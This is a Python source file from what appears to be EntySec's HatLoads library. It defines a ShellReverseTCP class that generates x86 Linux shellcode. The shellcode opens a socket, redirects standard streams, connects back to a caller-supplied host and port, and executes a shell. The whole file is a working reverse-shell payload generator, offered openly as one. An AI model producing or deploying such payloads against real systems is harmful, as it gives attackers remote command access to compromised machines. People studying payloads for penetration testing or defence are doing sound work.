#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL']
        else:
            shell = self.shell['sh']

        shell = [shell[::-1][i:i+4] for i in range(0, len(shell), 4)]
        shell_asm = ""

        for line in shell:
            shell_asm += f"push 0x{line.hex()}\n"

        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            xor ebx, ebx
            mul ebx
            push ebx
            inc ebx
            push ebx
            push byte +0x2
            mov ecx, esp
            mov al, 0x66
            int 0x80

            xchg eax, ebx
            pop ecx

        dup:
            mov al, 0x3f
            int 0x80

            dec ecx
            jns dup
            push 0x{rhost.hex()}
            push 0x{rport.hex()}0002
            mov ecx, esp
            mov al, 0x66
            push eax
            push ecx
            push ebx
            mov bl, 0x3
            mov ecx, esp
            int 0x80

            push edx
            {shell_asm}
            mov ebx, esp
            push edx
            push ebx
            mov ecx, esp
            mov al, 0xb
            int 0x80
        """

        if assemble:
            return self.assemble('x86', shellcode)
        return shellcode
